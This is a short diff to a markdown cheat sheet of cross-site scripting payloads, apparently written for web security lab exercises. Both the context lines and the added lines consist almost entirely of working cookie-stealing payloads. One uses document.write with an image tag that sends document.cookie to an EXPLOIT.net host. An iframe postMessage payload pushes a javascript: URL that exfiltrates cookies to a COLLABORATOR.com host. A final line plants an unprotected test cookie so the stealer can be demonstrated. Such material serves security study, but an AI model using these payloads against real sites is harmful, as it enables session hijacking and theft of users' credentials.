@@ -153,4 +153,19 @@ document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
 
 ```Javascript
 <script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
+```  
+
+>IFRAMEs
+
+```JavaScript
+<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
+    "type": "load-channel",
+    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
+}), "*");'>
+```  
+
+>Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.  
+
+```
+document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
 ```
